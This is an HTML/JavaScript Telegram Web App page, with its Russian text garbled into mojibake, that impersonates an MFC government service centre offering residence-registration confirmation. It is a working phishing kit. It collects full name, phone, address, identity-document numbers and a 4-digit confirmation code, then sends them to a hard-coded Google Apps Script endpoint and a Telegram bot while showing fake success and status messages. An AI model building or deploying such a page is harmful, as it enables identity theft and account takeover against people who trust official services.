<!doctype html>
<html lang="ru">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>–ú–§–¶ ‚Äî –ü–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏–∏</title>
  <script src="https://telegram.org/js/telegram-web-app.js"></script>
  <style>
    :root {
      --primary-color: #800000;
      --secondary-color: #660000;
      --info-color: #990000;
      --error-color: #B22222;
      --background-color: #F5E6E6;
      --white: #fff;
      --text-color: #333;
      --shadow: 0 4px 12px rgba(128,0,0,3);
      --input-bg: #EADADA;
      --input-border: #990000;
    }
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      font-family: 'Segoe UI', Arial, sans-serif;
      background: var(--background-color);
      padding: 20px; display: flex; justify-content: center; min-height: 100vh;
    }
    .container { max-width: 520px; width: 100%; background: var(--white); padding: 30px; border-radius: 16px; box-shadow: var(--shadow); text-align: center; }
    .step { display: none; text-align: left; }
    .step.active { display: block; }
    h2, h3 { margin-bottom: 20px; font-weight: 700; font-size: 1.6em; color: var(--primary-color); display: flex; align-items: center; gap: 10px; line-height: 1.3; }
    p { margin-bottom: 14px; }
    .input-group { margin-bottom: 20px; text-align: left; display: flex; flex-direction: column; }
    input {
      width: 100%; padding: 12px 15px; margin-top: 8px;
      border: 2px solid var(--input-border); border-radius: 10px; font-size: 16px;
      background: var(--input-bg); box-shadow: 0 2px 6px rgba(0,0,0,1);
      transition: border-color .3s, box-shadow .3s;
    }
    input:focus { outline: none; border-color: var(--primary-color); box-shadow: 0 4px 12px rgba(128,0,0,2); }
    .error { color: var(--error-color); font-size: 14px; margin-top: 6px; font-weight: 600; text-align: left; min-height: 1.2em; }
    .buttons { margin-top: 20px; display: flex; flex-direction: column; gap: 12px; }
    button {
      width: 100%; padding: 14px; border: none; border-radius: 10px; cursor: pointer;
      font-size: 16px; font-weight: 600; transition: background-color .3s, transform .1s;
      text-align: center; color: var(--white); user-select: none;
    }
    button:hover { transform: translateY(-2px); }
    button:disabled { background: #ccc; cursor: not-allowed; }
    .next { background: var(--primary-color); }
    .back { background: var(--secondary-color); }
    .menu-btn { background: var(--info-color); }
    .loading { display: none; color: var(--primary-color); font-size: 14px; margin-top: 10px; }

    .info-list { list-style-type: none; padding: 0; margin: 0 0 20px 0; }
    .info-list li {
      padding: 12px; background: var(--input-bg); border-radius: 8px; margin-bottom: 10px;
      box-shadow: 0 2px 4px rgba(0,0,0,0.1); transition: transform 0.2s;
    }
    .info-list li:hover { transform: translateY(-2px); }
    a { color: var(--primary-color); text-decoration: none; font-weight: 600; }
    a:hover { text-decoration: underline; }
    .faq-buttons, .doc-buttons, .status-buttons { display: flex; flex-direction: column; gap: 10px; margin-bottom: 20px; }
    .faq-answer, .doc-answer, .status-answer {
      display: none; padding: 15px; background: var(--input-bg); border-radius: 8px; margin-top: 10px; box-shadow: 0 2px 4px rgba(0,0,0,0.1);
    }
    .faq-answer.active, .doc-answer.active, .status-answer.active { display: block; }
  </style>
</head>
<body>
  <div class="container">
    <div id="wizard">
      <div class="step active" id="step-main">
        <h2 id="welcome-message">üìã –î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å, üëã</h2>
        <p>–ì–æ—Ç–æ–≤—ã –Ω–∞—á–∞—Ç—å –æ—Ñ–æ—Ä–º–ª–µ–Ω–∏–µ —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏–∏ –ø–æ –º–µ—Å—Ç—É –∂–∏—Ç–µ–ª—å—Å—Ç–≤–∞?</p>
        <div class="buttons">
          <button type="button" class="menu-btn" data-action="schedule">üìã –ó–∞–ø–∏—Å–∞—Ç—å—Å—è –Ω–∞ –ø—Ä–∏—ë–º</button>
          <button type="button" class="menu-btn" data-action="documents">üìú –°–ø–∏—Å–æ–∫ –¥–æ–∫—É–º–µ–Ω—Ç–æ–≤</button>
          <button type="button" class="menu-btn" data-action="check-status">üîç –ü—Ä–æ–≤–µ—Ä–∏—Ç—å —Å—Ç–∞—Ç—É—Å –∑–∞—è–≤–∫–∏</button>
          <button type="button" class="menu-btn" data-action="contact">üìû –°–≤—è–∑–∞—Ç—å—Å—è —Å –ø–æ–¥–¥–µ—Ä–∂–∫–æ–π</button>
          <button type="button" class="menu-btn" data-action="faq">‚ùì –ß–∞—Å—Ç—ã–µ –≤–æ–ø—Ä–æ—Å—ã</button>
        </div>
      </div>

      <div class="step" id="step-fullname">
        <h3>–í–≤–µ–¥–∏—Ç–µ –§–ò–û</h3>
        <div class="input-group">
          <input id="fullname" placeholder="–ò–≤–∞–Ω–æ–≤ –ò–≤–∞–Ω –ò–≤–∞–Ω–æ–≤–∏—á" />
          <div id="err-fullname" class="error"></div>
        </div>
        <div class="buttons">
          <button type="button" class="back">‚Ü©Ô∏è –í–µ—Ä–Ω—É—Ç—å—Å—è –Ω–∞–∑–∞–¥</button>
          <button type="button" class="next">–î–∞–ª–µ–µ</button>
        </div>
      </div>

      <div class="step" id="step-phone">
        <h3>–í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞</h3>
        <div class="input-group">
          <input id="phone" placeholder="+7 (900) 000-00-00" />
          <div id="err-phone" class="error"></div>
        </div>
        <div class="buttons">
          <button type="button" class="back">‚Ü©Ô∏è –í–µ—Ä–Ω—É—Ç—å—Å—è –Ω–∞–∑–∞–¥</button>
          <button type="button" class="next">–î–∞–ª–µ–µ</button>
        </div>
      </div>

      <div class="step" id="step-address">
        <h3>–ê–¥—Ä–µ—Å —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏–∏</h3>
        <div class="input-group">
          <input id="address" placeholder="–≥. –ú–æ—Å–∫–≤–∞, —É–ª. –õ–µ–Ω–∏–Ω–∞, –¥. 1" />
          <div id="err-address" class="error"></div>
        </div>
        <div class="buttons">
          <button type="button" class="back">‚Ü©Ô∏è –í–µ—Ä–Ω—É—Ç—å—Å—è –Ω–∞–∑–∞–¥</button>
          <button type="button" class="next">–î–∞–ª–µ–µ</button>
        </div>
      </div>

      <div class="step" id="step-document-type">
        <h3>–í—ã–±–µ—Ä–∏—Ç–µ —Ç–∏–ø –¥–æ–∫—É–º–µ–Ω—Ç–∞</h3>
        <div class="buttons doc-buttons">
          <button type="button" class="menu-btn" data-doc="–ü–∞—Å–ø–æ—Ä—Ç">–ü–∞—Å–ø–æ—Ä—Ç</button>
          <button type="button" class="menu-btn" data-doc="–°–ù–ò–õ–°">–°–ù–ò–õ–°</button>
          <button type="button" class="menu-btn" data-doc="–ò–ù–ù">–ò–ù–ù</button>
          <button type="button" class="menu-btn" data-doc="–í–æ–¥–∏—Ç–µ–ª—å—Å–∫–æ–µ —É–¥–æ—Å—Ç–æ–≤–µ—Ä–µ–Ω–∏–µ">–í–æ–¥–∏—Ç–µ–ª—å—Å–∫–æ–µ —É–¥–æ—Å—Ç–æ–≤–µ—Ä–µ–Ω–∏–µ</button>
        </div>
        <div class="buttons">
          <button type="button" class="back">‚Ü©Ô∏è –í–µ—Ä–Ω—É—Ç—å—Å—è –Ω–∞–∑–∞–¥</button>
          <button id="doc-next" type="button" class="next" disabled>–î–∞–ª–µ–µ</button>
        </div>
      </div>

      <div class="step" id="step-document-number">
        <h3>–ù–æ–º–µ—Ä –¥–æ–∫—É–º–µ–Ω—Ç–∞</h3>
        <div class="input-group">
          <input id="docnumber" placeholder="—Å–µ—Ä–∏—è –∏ –Ω–æ–º–µ—Ä" />
          <div id="err-doc" class="error"></div>
        </div>
        <div class="buttons">
          <button type="button" class="back">‚Ü©Ô∏è –í–µ—Ä–Ω—É—Ç—å—Å—è –Ω–∞–∑–∞–¥</button>
          <button type="button" class="next">–î–∞–ª–µ–µ</button>
        </div>
      </div>

      <div class="step" id="step-code">
        <h3>–ö–æ–¥</h3>
        <div class="input-group">
          <input id="code" placeholder="4 —Ü–∏—Ñ—Ä—ã" />
          <div id="err-code" class="error"></div>
        </div>
        <div class="buttons">
          <button type="button" class="back">‚Ü©Ô∏è –í–µ—Ä–Ω—É—Ç—å—Å—è –Ω–∞–∑–∞–¥</button>
          <button type="button" class="next">–î–∞–ª–µ–µ</button>
        </div>
      </div>

      <div class="step" id="step-confirmation">
        <h3>–ü–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ</h3>
        <p>–ü—Ä–æ–≤–µ—Ä—å—Ç–µ –≤–≤–µ–¥—ë–Ω–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ –∏ –æ—Ç–ø—Ä–∞–≤—å—Ç–µ –∑–∞—è–≤–∫—É.</p>
        <div class="buttons">
          <button type="button" class="back">‚Ü©Ô∏è –í–µ—Ä–Ω—É—Ç—å—Å—è –Ω–∞–∑–∞–¥</button>
          <button type="button" class="next">–û—Ç–ø—Ä–∞–≤–∏—Ç—å</button>
        </div>
        <div id="loading" class="loading">–û—Ç–ø—Ä–∞–≤–∫–∞‚Ä¶</div>
      </div>

      <div class="step" id="step-documents">
        <h3>üìú –°–ø–∏—Å–æ–∫ –¥–æ–∫—É–º–µ–Ω—Ç–æ–≤</h3>
        <div class="doc-buttons">
          <button type="button" class="menu-btn" data-doc="1">1. –ü–∞—Å–ø–æ—Ä—Ç</button>
          <button type="button" class="menu-btn" data-doc="2">2. –í—ã–ø–∏—Å–∫–∞ –ï–ì–†–ù</button>
          <button type="button" class="menu-btn" data-doc="3">3. –î–æ–≥–æ–≤–æ—Ä –Ω–∞–π–º–∞</button>
        </div>
        <div id="doc-answer-1" class="doc-answer">–ù–µ–æ–±—Ö–æ–¥–∏–º –¥–ª—è –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è –ª–∏—á–Ω–æ—Å—Ç–∏.</div>
        <div id="doc-answer-2" class="doc-answer">–¢—Ä–µ–±—É–µ—Ç—Å—è –¥–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏ –ø—Ä–∞–≤–∞ –Ω–∞ –ø—Ä–æ–∂–∏–≤–∞–Ω–∏–µ.</div>
        <div id="doc-answer-3" class="doc-answer">–û–±—è–∑–∞—Ç–µ–ª–µ–Ω –¥–ª—è –º—É–Ω–∏—Ü–∏–ø–∞–ª—å–Ω–æ–≥–æ –∂–∏–ª—å—è —Å —Å–æ–≥–ª–∞—Å–∏–µ–º –∂–∏–ª—å—Ü–æ–≤.</div>
        <div class="buttons">
          <button type="button" class="back">‚Ü©Ô∏è –í–µ—Ä–Ω—É—Ç—å—Å—è –Ω–∞–∑–∞–¥</button>
        </div>
      </div>

      <div class="step" id="step-check-status">
        <h3>üîç –ü—Ä–æ–≤–µ—Ä–∏—Ç—å —Å—Ç–∞—Ç—É—Å –∑–∞—è–≤–∫–∏</h3>
        <div class="status-buttons">
          <button type="button" class="menu-btn" data-status="1">1. –ü–æ –Ω–æ–º–µ—Ä—É –∑–∞—è–≤–∫–∏</button>
          <button type="button" class="menu-btn" data-status="2">2. –ü–æ –¥–∞–Ω–Ω—ã–º –ø–∞—Å–ø–æ—Ä—Ç–∞</button>
        </div>
        <div id="status-answer-1" class="status-answer">–í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä –∑–∞—è–≤–∫–∏ –¥–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏ —Å—Ç–∞—Ç—É—Å–∞.</div>
        <div id="status-answer-2" class="status-answer">–í–≤–µ–¥–∏—Ç–µ —Å–µ—Ä–∏—é –∏ –Ω–æ–º–µ—Ä –ø–∞—Å–ø–æ—Ä—Ç–∞ –¥–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏ —Å—Ç–∞—Ç—É—Å–∞.</div>
        <div class="buttons">
          <button type="button" class="back">‚Ü©Ô∏è –í–µ—Ä–Ω—É—Ç—å—Å—è –Ω–∞–∑–∞–¥</button>
        </div>
      </div>

      <div class="step" id="step-contact">
        <h3>üìû –°–≤—è–∑–∞—Ç—å—Å—è —Å –ø–æ–¥–¥–µ—Ä–∂–∫–æ–π</h3>
        <p>–û–ø–∏—à–∏—Ç–µ —Å–≤–æ—é –ø—Ä–æ–±–ª–µ–º—É –∏ —Å–≤—è–∂–∏—Ç–µ—Å—å —Å –Ω–∞–º–∏:</p>
        <a href="https://t.me/MFC_SUPPORT" target="_blank">–ü–µ—Ä–µ–π—Ç–∏ –≤ Telegram</a>
        <div class="buttons">
          <button type="button" class="back">‚Ü©Ô∏è –í–µ—Ä–Ω—É—Ç—å—Å—è –Ω–∞–∑–∞–¥</button>
        </div>
      </div>

      <div class="step" id="step-faq">
        <h3>‚ùì –ß–∞—Å—Ç—ã–µ –≤–æ–ø—Ä–æ—Å—ã</h3>
        <div class="faq-buttons">
          <button type="button" class="menu-btn" data-faq="1">1. –ó–∞—á–µ–º –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–∞—Ç—å —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏—é?</button>
          <button type="button" class="menu-btn" data-faq="2">2. –ö–∞–∫–∏–µ –¥–æ–∫—É–º–µ–Ω—Ç—ã –Ω—É–∂–Ω—ã?</button>
          <button type="button" class="menu-btn" data-faq="3">3. –ß—Ç–æ –±—É–¥–µ—Ç, –µ—Å–ª–∏ –Ω–µ –ø–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å?</button>
          <button type="button" class="menu-btn" data-faq="4">4. –ú–æ–∂–Ω–æ –ª–∏ –æ–Ω–ª–∞–π–Ω?</button>
          <button type="button" class="menu-btn" data-faq="5">5. –ö–∞–∫ –∏–∑–º–µ–Ω–∏—Ç—å –¥–∞–Ω–Ω—ã–µ?</button>
          <button type="button" class="menu-btn" data-faq="6">6. –°–∫–æ–ª—å–∫–æ –≤—Ä–µ–º–µ–Ω–∏ –∑–∞–Ω–∏–º–∞–µ—Ç –ø—Ä–æ—Ü–µ—Å—Å?</button>
        </div>
        <div id="faq-answer-1" class="faq-answer">–î–ª—è –∞–∫—Ç—É–∞–ª–∏–∑–∞—Ü–∏–∏ –¥–∞–Ω–Ω—ã—Ö –≤ –ï–ì–†–ù –∏ —Å–æ–±–ª—é–¥–µ–Ω–∏—è –∑–∞–∫–æ–Ω–æ–¥–∞—Ç–µ–ª—å—Å—Ç–≤–∞.</div>
        <div id="faq-answer-2" class="faq-answer">–ü–∞—Å–ø–æ—Ä—Ç, –≤—ã–ø–∏—Å–∫–∞ –ï–ì–†–ù, –¥–ª—è –º—É–Ω–∏—Ü–∏–ø–∞–ª—å–Ω–æ–≥–æ –∂–∏–ª—å—è ‚Äî –¥–æ–≥–æ–≤–æ—Ä –Ω–∞–π–º–∞.</div>
        <div id="faq-answer-3" class="faq-answer">–®—Ç—Ä–∞—Ñ 2000‚Äì5000 —Ä—É–±. (—Å—Ç. 19.15.1 –ö–æ–ê–ü –†–§).</div>
        <div id="faq-answer-4" class="faq-answer">–ß–∞—Å—Ç–∏—á–Ω–æ —á–µ—Ä–µ–∑ –ì–æ—Å—É—Å–ª—É–≥–∏, –Ω–æ –≤–∏–∑–∏—Ç –≤ –ú–§–¶ –æ–±—è–∑–∞—Ç–µ–ª–µ–Ω.</div>
        <div id="faq-answer-5" class="faq-answer">–ü–µ—Ä–µ—Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏—è –∑–∞ 30 –¥–Ω–µ–π —á–µ—Ä–µ–∑ –ú–§–¶.</div>
        <div id="faq-answer-6" class="faq-answer">–ü—Ä–æ—Ü–µ—Å—Å –∑–∞–Ω–∏–º–∞–µ—Ç –æ—Ç 3 –¥–æ 7 —Ä–∞–±–æ—á–∏—Ö –¥–Ω–µ–π –ø—Ä–∏ –Ω–∞–ª–∏—á–∏–∏ –≤—Å–µ—Ö –¥–æ–∫—É–º–µ–Ω—Ç–æ–≤.</div>
        <div class="buttons">
          <button type="button" class="back">‚Ü©Ô∏è –í–µ—Ä–Ω—É—Ç—å—Å—è –Ω–∞–∑–∞–¥</button>
        </div>
      </div>
    </div>
  </div>

  <script>
    let __lastSent = "";
    function sendToBotOnce(rec) {
      const tg = window.Telegram?.WebApp;
      const loading = document.getElementById("loading");
      if (loading) loading.style.display = "block";
      if (!tg) {
        console.log("Telegram WebApp not available, saving locally");
        alert("–î–∞–Ω–Ω—ã–µ —Å–æ—Ö—Ä–∞–Ω–µ–Ω—ã –ª–æ–∫–∞–ª—å–Ω–æ:\n" + JSON.stringify(rec, null, 2));
        if (loading) loading.style.display = "none";
        return;
      }
      try {
        const json = JSON.stringify({ type: "lead", payload: rec });
        if (json === __lastSent) {
          if (loading) loading.style.display = "none";
          return;
        }
        tg.ready();
        tg.sendData(json);
        tg.HapticFeedback?.impactOccurred?.("light");
        __lastSent = json;
        console.log("Data sent to Telegram:", json);
        if (loading) loading.style.display = "none";
      } catch (e) {
        console.error("sendData error:", e);
        alert("–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ –¥–∞–Ω–Ω—ã—Ö. –ü–æ–ø—Ä–æ–±—É–π—Ç–µ —Å–Ω–æ–≤–∞.");
        if (loading) loading.style.display = "none";
      }
    }

    function formatPhone(input) {
      let value = input.value.replace(/\D/g, '');
      if (value.length > 0 && value[0] !== '7') value = '7' + value;
      value = value.substring(0, 11);
      let formatted = '+7';
      if (value.length > 1) formatted += ' (' + value.substring(1, 4);
      if (value.length > 4) formatted += ') ' + value.substring(4, 7);
      if (value.length > 7) formatted += '-' + value.substring(7, 9);
      if (value.length > 9) formatted += '-' + value.substring(9, 11);
      input.value = formatted;
    }

    class MFCWizard {
      constructor() {
        this.steps = document.querySelectorAll(".step");
        this.currentStep = "main";
        this.formData = {};
        this.initEvents();
        this.updateWelcome();
        this.show("main");
      }

      initEvents() {
        const root = document.getElementById("wizard");
        if (!root) { console.error("Wizard container not found"); return; }
        root.addEventListener("click", (e) => {
          const t = e.target.closest("button");
          if (!t) return;
          if (t.classList.contains("next")) this.next();
          else if (t.classList.contains("back")) this.back();
          else if (t.classList.contains("menu-btn")) {
            const action = t.dataset.action;
            const doc = t.dataset.doc;
            const faq = t.dataset.faq;
            const status = t.dataset.status;
            if (faq) this.showFAQ(faq);
            else if (doc) this.selectDocument(doc);
            else if (status) this.showStatus(status);
            else this.menu(action, doc);
          }
        });
        ["fullname", "phone", "address", "docnumber", "code", "status-query"].forEach((id) => {
          const el = document.getElementById(id);
          if (el) {
            el.addEventListener("input", () => this.validate(this.currentStep));
            el.addEventListener("keypress", (e) => { if (e.key === "Enter") { e.preventDefault(); this.next(); } });
            if (id === "phone") el.addEventListener("input", () => formatPhone(el));
          }
        });
      }

      updateWelcome() {
        const el = document.getElementById("welcome-message");
        const tg = window.Telegram?.WebApp;
        let name = "–ì–æ—Å—Ç—å";
        try {
          const u = tg?.initDataUnsafe?.user;
          if (u) name = [u.first_name, u.last_name].filter(Boolean).join(" ") || u.username || "–ì–æ—Å—Ç—å";
        } catch (e) { console.warn("Error accessing Telegram user data:", e); }
        if (el) el.textContent = `üìã –î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å, ${name}! üëã`;
      }

      show(id) {
        this.steps.forEach((s) => s.classList.toggle("active", s.id === `step-${id}`));
        this.currentStep = id;
        ["err-fullname", "err-phone", "err-address", "err-doc", "err-code", "err-status"].forEach((eid) => {
          const el = document.getElementById(eid); if (el) el.textContent = "";
        });
        window.scrollTo({ top: 0, behavior: "smooth" });
        const input = document.querySelector(`#step-${id} input`); if (input) input.focus();
      }

      showFAQ(faqId) {
        const answers = document.querySelectorAll('.faq-answer');
        answers.forEach(answer => answer.classList.remove('active'));
        document.getElementById(`faq-answer-${faqId}`).classList.add('active');
      }

      selectDocument(doc) {
        this.formData["document-type"] = doc;
        const b = document.getElementById("doc-next"); if (b) b.disabled = false;
      }

      showStatus() {
        this.show("check-status");
      }

      next() {
        const e = (id) => document.getElementById(id);
        const v = (e(this.currentStep)?.value || "").trim();

        if (this.currentStep === "main") return this.menu("schedule");
        if (this.currentStep === "fullname") { this.formData.fullname = v; return this.show("phone"); }
        if (this.currentStep === "phone") { this.formData.phone = (document.getElementById("phone").value || '').trim(); return this.show("address"); }
        if (this.currentStep === "address") { this.formData.address = (document.getElementById("address").value || "").trim(); return this.show("document-type"); }
        if (this.currentStep === "document-type") {
          if (!this.formData["document-type"]) { alert("–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –≤—ã–±–µ—Ä–∏—Ç–µ —Ç–∏–ø –¥–æ–∫—É–º–µ–Ω—Ç–∞."); return; }
          return this.show("document-number");
        }
        if (this.currentStep === "document-number") { this.formData["document-number"] = (document.getElementById("docnumber").value || "").trim(); return this.show("code"); }
        if (this.currentStep === "code") { this.formData.code = (document.getElementById("code").value || "").trim(); return this.show("confirmation"); }
        if (this.currentStep === "confirmation") { return this.send(); }
        if (this.currentStep === "check-status") {
          const statusQuery = (document.getElementById("status-query").value || "").trim();
          if (statusQuery) alert("‚ùå –î–∞–Ω–Ω—ã–µ –Ω–µ –Ω–∞–π–¥–µ–Ω—ã. –ü—Ä–æ–π–¥–∏—Ç–µ —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏—é.");
          return this.show("main");
        }
      }

      back() {
        const map = {
          fullname: "main",
          phone: "fullname",
          address: "phone",
          "document-type": "address",
          "document-number": "document-type",
          code: "document-number",
          confirmation: "code",
          documents: "main",
          "check-status": "main",
          contact: "main",
          faq: "main"
        };
        this.show(map[this.currentStep] || "main");
        if (this.currentStep === "document-type") {
          const b = document.getElementById("doc-next"); if (b) b.disabled = true;
        }
      }

      menu(action) {
        if (action === "schedule") return this.show("fullname");
        if (action === "documents") return this.show("documents");
        if (action === "check-status") return this.show("check-status");
        if (action === "contact") return this.show("contact");
        if (action === "faq") return this.show("faq");
      }

      validate(step) {
        const e = (id) => document.getElementById(id);
        const v = (e(step)?.value || "").trim();
        ["err-fullname", "err-phone", "err-address", "err-doc", "err-code", "err-status"].forEach((eid) => {
          const el = document.getElementById(eid); if (el) el.textContent = "";
        });

        if (step === "fullname") {
          if (!/^[–ê-–Ø–Å][–∞-—è—ë]+ [–ê-–Ø–Å][–∞-—è—ë]+ [–ê-–Ø–Å][–∞-—è—ë]+$/.test(v)) { e("err-fullname").textContent = ""; return false; }
          return true;
        }
        if (step === "phone") {
          const cleanV = v.replace(/\D/g, '');
          if (cleanV.length !== 11 || !cleanV.startsWith('7')) { e("err-phone").textContent = ""; return false; }
          return true;
        }
        if (step === "address") {
          if (!/^[–∞-—è–ê-–Ø–Å—ë\s,\.\-\d]+$/.test(v) || v.length < 5) { e("err-address").textContent = "–í–≤–µ–¥–∏—Ç–µ –∞–¥—Ä–µ—Å (–Ω–∞–ø—Ä–∏–º–µ—Ä, –≥. –ú–æ—Å–∫–≤–∞, —É–ª. –õ–µ–Ω–∏–Ω–∞, –¥. 1)"; return false; }
          return true;
        }
        if (step === "document-number") { this.formData["document-number"] = v; return true; }
        if (step === "code") {
          if (!/^\d{4}$/.test(v)) { e("err-code").textContent = "–í–≤–µ–¥–∏—Ç–µ 4 —Ü–∏—Ñ—Ä—ã (–Ω–∞–ø—Ä–∏–º–µ—Ä, 1234)"; return false; }
          return true;
        }
        if (step === "check-status") {
          const statusQuery = v;
          if (!statusQuery) { e("err-status").textContent = "–í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä –∑–∞—è–≤–∫–∏ –∏–ª–∏ –¥–∞–Ω–Ω—ã–µ –ø–∞—Å–ø–æ—Ä—Ç–∞"; return false; }
          return true;
        }
        return true;
      }

      async send() {
        const rec = {
          timestamp: new Date().toISOString().slice(0, 19).replace("T", " "),
          fullname: this.formData.fullname || "",
          phone: this.formData.phone.replace(/\+/g, '') || "",
          address: this.formData.address || "",
          document: `${this.formData["document-type"] || ""} ${this.formData["document-number"] || ""}`.trim(),
          code: this.formData.code || ""
        };

        try { await sendToSheet(rec); } catch (err) { console.warn("sendToSheet error:", err); }
        sendToBotOnce(rec);

        this.formData = {};
        this.show("main");
        alert("–î–∞–Ω–Ω—ã–µ —É—Å–ø–µ—à–Ω–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω—ã!");
      }
    }

    try { new MFCWizard(); }
    catch (e) { console.error("Failed to initialize MFCWizard:", e); alert("–û—à–∏–±–∫–∞ –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏–∏. –ü–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∏—Ç–µ —Å—Ç—Ä–∞–Ω–∏—Ü—É."); }
  </script>

  <!-- –û—Ç–ø—Ä–∞–≤–∫–∞ –≤ Google Sheets (–±–µ–∑ preflight) -->
  <script>
    // –¢–í–û–ô URL Apps Script:
    const SHEETS_WEBAPP_URL = "https://script.google.com/macros/s/AKfycbzPKx98qFbrRyYT0Ia8Yq_MdC6R7KiPfrdd3GAhnxFEQLG2AEBick3EOiCsgU_A3FKi/exec";
    const SECRET = "benhillworkspeisworkhab";

    async function sendToSheet(rec) {
      const payload = JSON.stringify({ type: "lead", payload: rec, secret: SECRET });
      const loading = document.getElementById("loading");
      if (loading) loading.style.display = "block";
      try {
        const res = await fetch(SHEETS_WEBAPP_URL, {
          method: "POST",
          headers: { "Content-Type": "text/plain;charset=utf-8" },
          body: payload
        });
        const text = await res.text();
        let data = {}; try { data = JSON.parse(text); } catch {}
        if (!res.ok || !data.ok) throw new Error(data.error || text || "request failed");
        if (data.duplicate) alert("‚ö†Ô∏è –¢–∞–∫–∞—è –∑–∞–ø–∏—Å—å —É–∂–µ –µ—Å—Ç—å.");
        else alert("‚úÖ –î–∞–Ω–Ω—ã–µ –∑–∞–ø–∏—Å–∞–Ω—ã –≤ —Ç–∞–±–ª–∏—Ü—É.");
      } catch (err) {
        console.warn("sendToSheet error:", err);
      } finally {
        if (loading) loading.style.display = "none";
      }
    }
  </script>
</body>
</html>
